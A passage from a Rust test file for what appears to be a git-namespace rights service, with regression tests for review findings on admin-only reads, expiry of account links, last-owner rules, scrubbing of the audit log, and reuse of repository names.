    registry.forget_trust_record(&wanted).await;
    registry.plant_trust_record(stray(&f.stranger.did)).await;
    let report = projection::verify(
        &f.vtc.state,
        &registry,
        TEST_VTC_DID,
        &mut Backoff::default(),
    )
    .await
    .unwrap()
    .expect("the mock registry enumerates");
    assert_eq!((report.put, report.deleted), (1, 1));
    let records = registry.trust_records().await;
    assert!(records.contains_key(&wanted));
    assert!(!records.contains_key(&projection::tuple_key(
        &f.stranger.did,
        "git.commit.sign",
        &res
    )));

    // A restore: the mirror is gone, and the registry holds a stray. A plain
    // reconcile cannot see it; verify rebuilds the mirror first and does.
    for key in projection::published(&f.vtc.state).await.unwrap().keys() {
        f.vtc
            .state
            .git_ns
            .projection_ks
            .remove(format!("t:{key}"))
            .await
            .unwrap();
    }
    registry.plant_trust_record(stray(&f.carol.did)).await;
    let report = projection::verify(
        &f.vtc.state,
        &registry,
        TEST_VTC_DID,
        &mut Backoff::default(),
    )
    .await
    .unwrap()
    .unwrap();
    assert_eq!((report.put, report.deleted), (0, 1));
    assert!(
        !registry
            .trust_records()
            .await
            .contains_key(&projection::tuple_key(
                &f.carol.did,
                "git.commit.sign",
                &res
            ))
    );
    assert_eq!(
        projection::published(&f.vtc.state).await.unwrap().len(),
        registry.trust_records().await.len()
    );
}

// Finding 4 — the console reads are for community administrators.

#[tokio::test]
async fn finding_4_the_console_reads_refuse_a_context_scoped_admin() {
    let f = fixture().await;
    bind_manual(&f).await;
    for path in [
        "/git-ns/view",
        "/git-ns/rights",
        "/git-ns/accounts",
        "/git-ns/rights/issued-by-departed",
        "/git-ns/projection",
        "/git-ns/drift",
    ] {
        let (status, body) = get(&f, &f.admin.did, vec!["ops".into()], path).await;
        assert_eq!(status, 403, "{path}: {body}");
    }
    for path in [
        "/git-ns/view",
        "/git-ns/rights",
        "/git-ns/accounts",
        "/git-ns/rights/issued-by-departed",
        "/git-ns/projection",
        "/git-ns/drift",
    ] {
        let (status, body) = get(&f, &f.admin.did, vec![], path).await;
        assert_eq!(status, 200, "{path}: {body}");
    }
}

// Finding 5 — finishing one's own reservation needs no administrator.

#[tokio::test]
async fn finding_5_under_the_default_config_an_owner_adopts_their_own_reservation() {
    let f = fixture().await;
    assert!(GitNsConfig::default().elevated_requires_admin);
    let ns = bind_manual(&f).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.bob.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await);
    ok(&send(
        &f.vtc.state,
        &f.bob,
        "repo/create",
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public" }),
    )
    .await);
    let body = ok(&send(
        &f.vtc.state,
        &f.bob,
        "repo/adopt",
        json!({ "resource": "github.com/acme/gadgets", "owners": [f.bob.did] }),
    )
    .await);
    assert_eq!(body["repo"]["state"], "active");

    // Everything else elevated still needs an administrator by default.
    let out = send(
        &f.vtc.state,
        &f.bob,
        "repo/transfer",
        json!({ "resource": "github.com/acme/gadgets", "to": f.carol.did }),
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
}

// Finding 6 — an account link is for the right forge, and in time.

async fn link(f: &Fixture, who: &Party) -> String {
    ok(&send(
        &f.vtc.state,
        who,
        "account/link",
        json!({ "forge": "github.com" }),
    )
    .await)["linkId"]
        .as_str()
        .unwrap()
        .to_string()
}

async fn link_state(f: &Fixture, who: &Party, id: String) -> Value {
    ok(&send(
        &f.vtc.state,
        who,
        "account/link-status",
        json!({ "linkId": id }),
    )
    .await)["state"]
        .clone()
}

#[tokio::test]
async fn finding_6_account_linked_is_refused_on_another_forge_or_after_expiry() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    let last_job = |f: &Fixture| f.bridge.jobs.lock().unwrap().last().unwrap().1["jobId"].clone();
    // Another forge's identity.
    let id = link(&f, &f.bob).await;
    let out = event(
        &f,
        &ns,
        json!({ "type": "accountLinked", "jobId": last_job(&f), "account": { "forge": "codeberg.org", "id": "1", "login": "bob" } }),
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
    assert_eq!(link_state(&f, &f.bob, id).await, "failed");

    // After the attempt lapsed.
    let id = link(&f, &f.carol).await;
    let mut attempt = store::get_link(&f.vtc.state.git_ns.ks, &id)
        .await
        .unwrap()
        .unwrap();
    attempt.expires_at = "2020-01-01T00:00:00Z".parse().unwrap();
    store::put_link(&f.vtc.state.git_ns.ks, &attempt)
        .await
        .unwrap();
    let out = event(
        &f,
        &ns,
        json!({ "type": "accountLinked", "jobId": last_job(&f), "account": { "forge": "github.com", "id": "2", "login": "carol" } }),
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
    assert_eq!(link_state(&f, &f.carol, id).await, "expired");
    let accounts = super::bridge::linked_accounts(&f.vtc.state).await.unwrap();
    assert!(accounts.is_empty());

    // A good link goes through the members write path: the member's other
    // extensions survive it.
    crate::members::storage::edit_member(&f.vtc.state.members_ks, &f.bob.did, |m| {
        m.extensions = json!({ "note": "kept" });
        true
    })
    .await
    .unwrap();
    let id = link(&f, &f.bob).await;
    ok(&event(
        &f,
        &ns,
        json!({ "type": "accountLinked", "jobId": last_job(&f), "account": { "forge": "github.com", "id": "3", "login": "bob" } }),
    )
    .await);
    assert_eq!(link_state(&f, &f.bob, id).await, "linked");
    let bob = crate::members::get_member(&f.vtc.state.members_ks, &f.bob.did)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(bob.extensions["note"], "kept");
    assert_eq!(bob.extensions["forges"]["github.com"]["login"], "bob");
}

// Finding 7 — an expiring right never keeps the last-admin or last-owner rule.

#[tokio::test]
async fn finding_7_an_expiring_co_admin_or_co_owner_does_not_count_toward_the_last() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    let later = "2099-01-01T00:00:00Z";
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "right/grant",
        json!({ "subject": f.carol.did, "right": "git.ns.admin", "resource": "github.com/acme", "expiresAt": later }),
    )
    .await);
    let out = send(
        &f.vtc.state,
        &f.admin,
        "right/revoke",
        json!({ "subject": f.admin.did, "right": "git.ns.admin", "resource": "github.com/acme" }),
    )
    .await;
    assert_eq!(code(&out), "git-ns:lastAdmin");

    ok(&send(
        &f.vtc.state,
        &f.admin,
        "right/grant",
        json!({ "subject": f.carol.did, "right": "git.repo.own", "resource": res, "expiresAt": later }),
    )
    .await);
    let out = send(
        &f.vtc.state,
        &f.admin,
        "right/revoke",
        json!({ "subject": f.bob.did, "right": "git.repo.own", "resource": res }),
    )
    .await;
    assert_eq!(code(&out), "git-ns:lastOwner");
}

// Finding 8 — the departure sweep keeps the departed member's DID out of the log.

#[tokio::test]
async fn finding_8_departure_audit_rows_carry_no_plaintext_departed_did() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    ok(&grant(&f, &f.bob, &f.carol.did, "git.commit.sign", &res).await);
    let before: std::collections::BTreeSet<Vec<u8>> = f
        .vtc
        .state
        .audit_ks
        .prefix_iter_raw(Vec::new())
        .await
        .unwrap()
        .into_iter()
        .map(|(k, _)| k)
        .collect();
    crate::acl::delete_acl_entry(&f.vtc.state.acl_ks, &f.bob.did)
        .await
        .unwrap();
    assert!(super::lifecycle::sweep(&f.vtc.state).await.unwrap());
    let new: Vec<Value> = f
        .vtc
        .state
        .audit_ks
        .prefix_iter_raw(Vec::new())
        .await
        .unwrap()
        .into_iter()
        .filter(|(k, _)| !before.contains(k))
        .map(|(_, v)| serde_json::from_slice(&v).unwrap())
        .collect();
    assert!(new.len() >= 2, "the revocation and the orphaning");
    for row in &new {
        assert!(
            !row.to_string().contains(&f.bob.did),
            "the departed member's DID in plaintext: {row}"
        );
        assert_eq!(row["actor_did_plain"], TEST_VTC_DID, "{row}");
    }
}

// Finding 9.

/// 9a — a name whose previous records are still being withdrawn cannot be
/// created or adopted again until they are gone.
#[tokio::test]
async fn finding_9a_create_and_adopt_wait_for_an_old_names_withdrawal() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    adopt_with_forge_id(&f, "github.com/acme/widgets", "100").await;
    let registry = MockRegistryClient::new();
    reconcile(&f, &registry).await;
    // Renamed on the forge: the old name is free there, but its records are
    // still in the registry until the projector withdraws them.
    ok(&event(
        &f,
        &ns,
        json!({ "type": "repoRenamed", "forgeId": "100", "from": "github.com/acme/widgets", "to": "github.com/acme/widgets-core" }),
    )
    .await);
    let create = json!({ "namespace": ns, "name": "widgets", "visibility": "public", "owners": [f.bob.did] });
    let out = send(&f.vtc.state, &f.admin, "repo/create", create.clone()).await;
    assert_eq!(code(&out), "unavailable");
    let out = send(
        &f.vtc.state,
        &f.admin,
        "repo/adopt",
        json!({ "resource": "github.com/acme/widgets", "owners": [f.carol.did] }),
    )
    .await;
    assert_eq!(code(&out), "unavailable");

    reconcile(&f, &registry).await;
    ok(&send(&f.vtc.state, &f.admin, "repo/create", create).await);
}

/// 9b — a later report naming the installation clears `installationRemoved`.
#[tokio::test]
async fn finding_9b_a_later_installation_report_clears_installation_removed() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    ok(&event(&f, &ns, json!({ "type": "installationRemoved" })).await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(snap.namespace(&ns).unwrap().installation_removed);
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({
            "namespace": ns,
            "event": { "type": "repoDeleted", "forgeId": "999", "resource": "github.com/acme/nothing" },
            "ext": { "org.openvtc.git-ns": { "namespace": { "installationId": "55120034" } } },
        }),
    )
    .await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(!snap.namespace(&ns).unwrap().installation_removed);
}

/// 9c — a result that lands while its job's send is in flight is not
/// overwritten by the dispatcher's write-back.
#[tokio::test]
async fn finding_9c_a_result_racing_the_send_survives_the_write_back() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/create",
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public", "owners": [f.bob.did] }),
    )
    .await);
    *f.bridge.race.lock().unwrap() = Some(f.vtc.state.git_ns.jobs_ks.clone());
    super::bridge::dispatch_due(&f.vtc.state).await.unwrap();
    let create = super::bridge::list_jobs(&f.vtc.state.git_ns.jobs_ks)
        .await
        .unwrap()
        .into_iter()
        .find(|j| j.kind == super::bridge::JobKind::CreateRepo)
        .unwrap();
    assert_eq!(create.state, super::bridge::JobState::Succeeded);
    assert!(create.result.is_some());
}

/// 9e — a repository an unbind left behind is shown to administrators only.
#[tokio::test]
async fn finding_9e_detached_repositories_of_an_unbound_namespace_are_hidden_from_members() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let ns = snap.repo_at(&res).unwrap().namespace_id.clone();
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/unbind",
        json!({ "namespace": ns }),
    )
    .await);
    let bob = ok(&send(&f.vtc.state, &f.bob, "view", json!({})).await);
    assert_eq!(bob["repos"], json!([]));
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let admin = super::view::build(&snap, super::view::Viewer::Administrator, None);
    assert_eq!(admin["repos"].as_array().unwrap().len(), 1);
}

/// 9g — under the default policy an external signer may give up their own
/// right (the policy admits resignation for anyone).
#[tokio::test]
async fn finding_9g_an_external_signer_resigns_under_the_default_policy() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    // An external signer's row, as a community with a permissive policy
    // would have granted it.
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let scope = Scope::Repo(snap.repo_at(&res).unwrap().id.clone());
    let mut set = store::get_rights(&f.vtc.state.git_ns.ks, &scope)
        .await
        .unwrap();
    let mut row = set.rows[0].clone();
    row.subject = f.stranger.did.clone();
    row.right = super::model::Right::CommitSign;
    row.subject_was_member = false;
    set.rows.push(row);
    store::put_rights(&f.vtc.state.git_ns.ks, &scope, &set)
        .await
        .unwrap();
    let body = ok(&send(
        &f.vtc.state,
        &f.stranger,
        "right/revoke",
        json!({ "subject": f.stranger.did, "right": "git.commit.sign", "resource": res }),
    )
    .await);
    assert_eq!(body["revoked"]["subject"], json!(f.stranger.did));
}

/// Closing the unbind gap: the role-derived grants a namespace's projection
/// published go back to the hook relay at unbind — queued for it at once,
/// and handed back (not withdrawn) by the projector — so a member keeps the
/// v0.1 right without waiting for their next membership event.
#[tokio::test]
async fn unbind_hands_role_derived_grants_back_to_the_hook_relay_at_once() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    map_members_to(&f, &res).await;
    let registry = MockRegistryClient::new();
    reconcile(&f, &registry).await;
    let carol = projection::tuple_key(&f.carol.did, "git.commit.sign", &res);
    let bob_own = projection::tuple_key(&f.bob.did, "git.repo.own", &res);
    assert!(registry.trust_records().await.contains_key(&carol));

    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let ns = snap.repo_at(&res).unwrap().namespace_id.clone();
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/unbind",
        json!({ "namespace": ns }),
    )
    .await);

    // Queued for the relay now, one grant per mapped member.
    let mut queued: Vec<(String, String)> = crate::hooks::list_jobs(&f.vtc.state.hooks_queue_ks)
        .await
        .unwrap()
        .into_iter()
        .filter(|j| j.op == crate::hooks::HookOp::Grant)
        .map(|j| (j.subject_did, j.resource))
        .collect();
    queued.sort();
    let mut expected = vec![
        (f.bob.did.clone(), res.clone()),
        (f.carol.did.clone(), res.clone()),
    ];
    expected.sort();
    assert_eq!(queued, expected);

    // The projector withdraws the namespace's own records, but hands the
    // role-derived ones back instead of deleting what the relay now owns.
    let report = reconcile(&f, &registry).await;
    assert_eq!(report.handed_back, 2, "bob's and carol's commit rights");
    let records = registry.trust_records().await;
    assert!(records.contains_key(&carol));
    assert!(!records.contains_key(&bob_own));
    assert!(
        !projection::published(&f.vtc.state)
            .await
            .unwrap()
            .contains_key(&carol),
        "no longer the projection's"
    );
    // A later pass leaves it alone.
    let again = reconcile(&f, &registry).await;
    assert_eq!((again.deleted, again.handed_back), (0, 0));
    assert!(registry.trust_records().await.contains_key(&carol));
}

// ── re-review R1: one row per name ──────────────────────────────────────────

fn rows_at(snap: &Snapshot, resource: &str) -> Vec<super::model::Repo> {
    snap.repos
        .iter()
        .filter(|r| r.resource == resource)
        .cloned()
        .collect()
}

/// R1 (a): deleted on the forge, then a new repository at the same name. The
/// old row must not linger for `repo_at` to pick at random — the reviewer saw
/// adoption resurrect it in 4 of 12 runs, so this runs repeatedly.
#[tokio::test]
async fn r1_a_name_reused_after_a_delete_is_recorded_once_and_adopted_as_the_new_repository() {
    for run in 0..8 {
        let f = fixture().await;
        let ns = bind_bridge(&f).await;
        adopt_with_forge_id(&f, "github.com/acme/widgets", "100").await;
        ok(&event(
            &f,
            &ns,
            json!({ "type": "repoDeleted", "forgeId": "100", "resource": "github.com/acme/widgets" }),
        )
        .await);
        ok(&event(
            &f,
            &ns,
            json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": "github.com/acme/widgets" }),
        )
        .await);
        let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
        let at = rows_at(&snap, "github.com/acme/widgets");
        assert_eq!(at.len(), 1, "run {run}: {at:?}");
        assert_eq!(at[0].forge_id.as_deref(), Some("200"), "run {run}");

        ok(&send(
            &f.vtc.state,
            &f.admin,
            "repo/adopt",
            json!({ "resource": "github.com/acme/widgets", "owners": [f.carol.did] }),
        )
        .await);
        let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
        let repo = snap.repo_at("github.com/acme/widgets").unwrap().clone();
        assert_eq!(repo.state, RepoState::Active, "run {run}");
        assert_eq!(repo.forge_id.as_deref(), Some("200"), "run {run}");

        // The deleted repository's id, renamed: nothing of the new one moves.
        ok(&event(
            &f,
            &ns,
            json!({ "type": "repoRenamed", "forgeId": "100", "from": "github.com/acme/widgets", "to": "github.com/acme/widgets-old" }),
        )
        .await);
        let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
        assert!(
            snap.repo_at("github.com/acme/widgets-old").is_none(),
            "run {run}"
        );
        assert!(
            snap.rows(&Scope::Repo(repo.id.clone()))
                .iter()
                .any(|r| r.subject == f.carol.did),
            "run {run}"
        );
    }
}

/// R1 (b): unbound and bound again, then the bridge reports what is on the
/// forge. The row the unbind detached is taken up again when it is the same
/// repository, and folded away when it is not — never left beside a new one.
#[tokio::test]
async fn r1_b_after_unbind_and_rebind_a_name_is_recorded_once() {
    for (run, fid) in ["100", "200", "100", "200", "100", "200"]
        .into_iter()
        .enumerate()
    {
        let f = fixture().await;
        let ns = bind_bridge(&f).await;
        adopt_with_forge_id(&f, "github.com/acme/widgets", "100").await;
        ok(&send(
            &f.vtc.state,
            &f.admin,
            "namespace/unbind",
            json!({ "namespace": ns }),
        )
        .await);
        let ns = bind_bridge(&f).await;
        ok(&event(
            &f,
            &ns,
            json!({ "type": "repoCreatedUnmanaged", "forgeId": fid, "resource": "github.com/acme/widgets" }),
        )
        .await);
        let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
        let at = rows_at(&snap, "github.com/acme/widgets");
        assert_eq!(at.len(), 1, "run {run}: {at:?}");
        assert_eq!(at[0].forge_id.as_deref(), Some(fid), "run {run}");
        assert_eq!(at[0].state, RepoState::Unmanaged, "run {run}");
        assert_eq!(at[0].namespace_id, ns, "run {run}");
        assert!(
            snap.rows(&Scope::Repo(at[0].id.clone())).is_empty(),
            "run {run}"
        );
    }
}

/// R1: adopting a detached row with no event in between forgets its forge id,
/// so the inspection names whatever is at the name now.
#[tokio::test]
async fn r1_adopting_a_detached_repository_forgets_its_old_forge_id() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    adopt_with_forge_id(&f, "github.com/acme/widgets", "100").await;
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "namespace/unbind",
        json!({ "namespace": ns }),
    )
    .await);
    bind_bridge(&f).await;
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/adopt",
        json!({ "resource": "github.com/acme/widgets", "owners": [f.carol.did] }),
    )
    .await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let at = rows_at(&snap, "github.com/acme/widgets");
    assert_eq!(at.len(), 1);
    assert_eq!(at[0].state, RepoState::Active);
    assert_eq!(at[0].forge_id, None);
}

// ── re-review R3: every member-row writer takes the edit lock ───────────────

/// The removal ceremony writes the member row under the members edit lock,
/// so it cannot interleave with an `accountLinked` (which reads and writes
/// the row under it): a link that lands after the removal finds the member
/// gone and records nothing, and never writes back a pre-removal copy.
#[tokio::test]
async fn r3_a_removal_and_an_account_link_are_serialised_on_the_member_row() {
    let f = fixture().await;
    let ns = bind_bridge(&f).await;
    let _ = link(&f, &f.bob).await;
    let job = f.bridge.jobs.lock().unwrap().last().unwrap().1["jobId"].clone();

    let held = crate::members::storage::edit_lock().await;
    let state = f.vtc.state.clone();
    let bob = f.bob.did.clone();
    let removal = tokio::spawn(async move {
        crate::ceremony::apply(
            &state,
            crate::ceremony::EffectPlan::Depart {
                subject: bob,
                disposition: Some("tombstone".into()),
            },
            TEST_VTC_DID,
        )
        .await
        .map(|_| ())
    });
    tokio::time::sleep(Duration::from_millis(200)).await;
    let m = crate::members::get_member(&f.vtc.state.members_ks, &f.bob.did)
        .await
        .unwrap()
        .unwrap();
    assert!(
        m.removed_at.is_none(),
        "the removal waits for the edit lock rather than writing past it"
    );
    drop(held);
    removal.await.unwrap().unwrap();

    let _ = event(
        &f,
        &ns,
        json!({ "type": "accountLinked", "jobId": job, "account": { "forge": "github.com", "id": "9", "login": "bob" } }),
    )
    .await;
    let m = crate::members::get_member(&f.vtc.state.members_ks, &f.bob.did)
        .await
        .unwrap()
        .unwrap();
    assert!(
        m.removed_at.is_some(),
        "the link did not resurrect the member"
    );
    assert!(m.extensions.get("forges").is_none());
}

// ── re-review R4: a transfer hands over ownership as durable as the caller's ─

async fn own_rows(f: &Fixture, res: &str) -> Vec<super::model::RightRow> {
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    snap.rows(&Scope::Repo(snap.repo_at(res).unwrap().id.clone()))
        .iter()
        .filter(|r| r.right == super::model::Right::RepoOwn)
        .cloned()
        .collect()
}

#[tokio::test]
async fn r4_a_transfer_leaves_the_recipient_as_permanent_an_owner_as_the_caller_was() {
    let f = fixture_with(GitNsConfig {
        elevated_requires_admin: false,
        ..GitNsConfig::default()
    })
    .await;
    let res = active_repo(&f).await;
    let later = "2099-01-01T00:00:00Z";
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "right/grant",
        json!({ "subject": f.carol.did, "right": "git.repo.own", "resource": res, "expiresAt": later }),
    )
    .await);

    // Bob, a permanent owner, hands over to Carol, who holds an expiring one:
    // she must end with a permanent record, or the repository is ownerless
    // when hers lapses.
    ok(&send(
        &f.vtc.state,
        &f.bob,
        "repo/transfer",
        json!({ "resource": res, "to": f.carol.did }),
    )
    .await);
    let rows = own_rows(&f, &res).await;
    assert!(rows.iter().all(|r| r.subject != f.bob.did));
    let carol: Vec<_> = rows.iter().filter(|r| r.subject == f.carol.did).collect();
    assert_eq!(carol.len(), 1);
    assert_eq!(carol[0].expires_at, None);

    // An owner whose record expires hands over no more than that.
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "right/grant",
        json!({ "subject": f.bob.did, "right": "git.repo.own", "resource": res, "expiresAt": later }),
    )
    .await);
    ok(&send(
        &f.vtc.state,
        &f.bob,
        "repo/transfer",
        json!({ "resource": res, "to": f.admin.did }),
    )
    .await);
    let rows = own_rows(&f, &res).await;
    let admin: Vec<_> = rows.iter().filter(|r| r.subject == f.admin.did).collect();
    assert_eq!(admin.len(), 1);
    assert_eq!(
        admin[0].expires_at,
        Some(later.parse().unwrap()),
        "the recipient inherits the caller's expiry"
    );
}

/// Re-review of b0e67823: the verifier's probes for R1, kept as regression
/// tests (the looping sequences cut to 20 runs each).
mod r1_probes {
    use super::super::model::{Repo, Right};
    use super::*;

    const X: &str = "github.com/acme/widgets";
    const Z: &str = "github.com/acme/widgets-old";

    fn live_at(snap: &Snapshot, res: &str) -> Vec<Repo> {
        snap.repos
            .iter()
            .filter(|r| r.resource == res && r.state != RepoState::Detached)
            .cloned()
            .collect()
    }
    fn all_at(snap: &Snapshot, res: &str) -> Vec<Repo> {
        snap.repos
            .iter()
            .filter(|r| r.resource == res)
            .cloned()
            .collect()
    }
    fn rng(seed: &mut u64) -> u64 {
        *seed = seed
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        *seed >> 33
    }
    async fn snap(f: &Fixture) -> Snapshot {
        Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap()
    }

    async fn answer_latest_inspect(f: &Fixture, res: &str, fid: &str) {
        let mut jobs: Vec<_> = super::super::bridge::list_jobs(&f.vtc.state.git_ns.jobs_ks)
            .await
            .unwrap()
            .into_iter()
            .filter(|j| {
                j.kind == super::super::bridge::JobKind::Inspect
                    && j.payload["repo"] == res
                    && j.result.is_none()
            })
            .collect();
        jobs.sort_by_key(|j| j.created_at);
        let j = jobs.last().expect("an inspect job");
        ok(&send(
            &f.vtc.state,
            &f.bridge_party,
            "bridge/result",
            json!({
                "jobId": j.job_id, "outcome": "succeeded",
                "repo": { "resource": res, "forgeId": fid },
                "steps": [{ "step": "requiredCheck", "outcome": "unchanged" }],
            }),
        )
        .await);
    }

    async fn adopt(f: &Fixture, res: &str, owner: &Party) -> TrustTaskOutcome {
        send(
            &f.vtc.state,
            &f.admin,
            "repo/adopt",
            json!({ "resource": res, "owners": [owner.did] }),
        )
        .await
    }

    fn carol_holds(s: &Snapshot, id: &str, carol: &str) -> bool {
        s.rows(&Scope::Repo(id.to_string()))
            .iter()
            .any(|r| r.subject == carol && r.right == Right::RepoOwn)
    }

    /// Sequence A: delete(100) + createdUnmanaged(200), orders and field shapes varied.
    #[tokio::test]
    async fn p_r1_seq_a_loop() {
        for run in 0..20u64 {
            let mut seed = run * 7919 + 13;
            let f = fixture().await;
            let ns = bind_bridge(&f).await;
            ok(&adopt(&f, X, &f.bob).await);
            answer_latest_inspect(&f, X, "100").await;
            let del = match rng(&mut seed) % 3 {
                0 => json!({ "type": "repoDeleted", "forgeId": "100", "resource": X }),
                1 => json!({ "type": "repoDeleted", "resource": X, "forgeId": "100" }),
                _ => json!({ "resource": X, "forgeId": "100", "type": "repoDeleted" }),
            };
            let create = json!({ "type": "repoCreatedUnmanaged", "forgeId": "200", "resource": X });
            let order = rng(&mut seed) % 2;
            if order == 0 {
                ok(&event(&f, &ns, del.clone()).await);
                ok(&event(&f, &ns, create.clone()).await);
            } else {
                ok(&event(&f, &ns, create.clone()).await);
                ok(&event(&f, &ns, del.clone()).await);
            }
            // occasionally a duplicate create
            if rng(&mut seed).is_multiple_of(2) {
                ok(&event(&f, &ns, create.clone()).await);
            }
            let s = snap(&f).await;
            let live = live_at(&s, X);
            assert_eq!(
                live.len(),
                1,
                "run {run} order {order} del {del}: {:?}",
                all_at(&s, X)
            );
            assert_eq!(live[0].forge_id.as_deref(), Some("200"), "run {run}");
            assert!(s.repos.iter().all(|r| r.forge_id.as_deref() != Some("100") || r.state == RepoState::Detached), "run {run}");
            ok(&adopt(&f, X, &f.carol).await);
            let s = snap(&f).await;
            let repo = s.repo_at(X).unwrap().clone();
            assert_eq!(
                repo.forge_id.as_deref(),
                Some("200"),
                "run {run}: adopt bound stale {:?}",
                all_at(&s, X)
            );
            assert_eq!(live_at(&s, X).len(), 1, "run {run}");
            let _ = event(
                &f,
                &ns,
                json!({ "type": "repoRenamed", "forgeId": "100", "from": X, "to": Z }),
            )
            .await;
            let s = snap(&f).await;
            assert!(
                s.repo_at(Z).is_none(),
                "run {run}: moved {:?}",
                s.repo_at(Z)
            );
            let now = s.repo_at(X).unwrap();
            assert_eq!(now.id, repo.id, "run {run}");
            assert!(carol_holds(&s, &repo.id, &f.carol.did), "run {run}");
        }
    }

    /// Sequence B: unbind + rebind + createdUnmanaged, with repeat cycles.
    #[tokio::test]
    async fn p_r1_seq_b_loop() {
        for run in 0..20u64 {
            let mut seed = run * 104729 + 7;
            let f = fixture().await;
            let mut ns = bind_bridge(&f).await;
            ok(&adopt(&f, X, &f.bob).await);
            answer_latest_inspect(&f, X, "100").await;
            let cycles = 1 + rng(&mut seed) % 3;
            let mut cur = "100".to_string();
            for c in 0..cycles {
                ok(&send(
                    &f.vtc.state,
                    &f.admin,
                    "namespace/unbind",
                    json!({ "namespace": ns }),
                )
                .await);
                ns = bind_bridge(&f).await;
                let fid = if rng(&mut seed).is_multiple_of(2) {
                    "100".to_string()
                } else {
                    format!("{}", 200 + run * 10 + c)
                };
                ok(&event(
                    &f,
                    &ns,
                    json!({ "type": "repoCreatedUnmanaged", "forgeId": fid, "resource": X }),
                )
                .await);
                let s = snap(&f).await;
                assert_eq!(
                    all_at(&s, X).len(),
                    1,
                    "run {run} c {c}: {:?}",
                    all_at(&s, X)
                );
                assert_eq!(live_at(&s, X)[0].forge_id.as_deref(), Some(fid.as_str()));
                // adopt, and inspection confirms the fid
                ok(&adopt(&f, X, &f.carol).await);
                let s = snap(&f).await;
                let r = s.repo_at(X).unwrap().clone();
                assert_eq!(r.forge_id.as_deref(), Some(fid.as_str()), "run {run} c {c}");
                assert_eq!(live_at(&s, X).len(), 1);
                cur = fid;
            }
            let s = snap(&f).await;
            let repo = s.repo_at(X).unwrap().clone();
            if cur != "100" {
                let _ = event(
                    &f,
                    &ns,
                    json!({ "type": "repoRenamed", "forgeId": "100", "from": X, "to": Z }),
                )
                .await;
                let s = snap(&f).await;
                assert!(
                    s.repo_at(Z).is_none(),
                    "run {run}: rename of 100 moved {:?}",
                    s.repo_at(Z)
                );
                assert!(carol_holds(&s, &repo.id, &f.carol.did), "run {run}");
            }
        }
    }

    /// Unbind+rebind, adopt directly (no event), then a rename of the old id before inspection.
    #[tokio::test]
    async fn p_r1_adopt_detached_then_rename_old_id_before_inspection() {
        let f = fixture().await;
        let ns = bind_bridge(&f).await;
        ok(&adopt(&f, X, &f.bob).await);
        answer_latest_inspect(&f, X, "100").await;
        ok(&send(
            &f.vtc.state,
            &f.admin,
            "namespace/unbind",
            json!({ "namespace": ns }),
        )
        .await);
        let ns = bind_bridge(&f).await;
        ok(&adopt(&f, X, &f.carol).await);
        let s = snap(&f).await;
        let id = s.repo_at(X).unwrap().id.clone();
        assert_eq!(s.repo_at(X).unwrap().forge_id, None);
        let _ = event(
            &f,
            &ns,
            json!({ "type": "repoRenamed", "forgeId": "100", "from": X, "to": Z }),
        )
        .await;
        let s = snap(&f).await;
        assert!(
            s.repo_at(Z).is_none(),
            "a row with no forge id is never moved by a rename"
        );
        let at = s.repo_at(X).unwrap();
        assert_eq!(at.id, id);
        assert_eq!(at.forge_id, None);
        assert!(carol_holds(&s, &id, &f.carol.did));
    }

    /// createdUnmanaged over a pendingCreate reservation.
    #[tokio::test]
    async fn p_r1_created_over_pending_create() {
        let f = fixture().await;
        let ns = bind_bridge(&f).await;
        ok(&send(
            &f.vtc.state,
            &f.admin,
            "repo/create",
            json!({ "namespace": ns, "name": "widgets", "visibility": "public", "owners": [f.bob.did] }),
        )
        .await);
        let s = snap(&f).await;
        assert_eq!(s.repo_at(X).unwrap().state, RepoState::PendingCreate);
        ok(&event(
            &f,
            &ns,
            json!({ "type": "repoCreatedUnmanaged", "forgeId": "300", "resource": X }),
        )
        .await);
        let s = snap(&f).await;
        let at = all_at(&s, X);
        assert_eq!(at.len(), 1, "{at:?}");
        assert_eq!(at[0].state, RepoState::PendingCreate);
        assert_eq!(at[0].forge_id, None);
    }

    /// Suspected gap: a reservation at X, and forge id 200 known at Y — created(200, X).
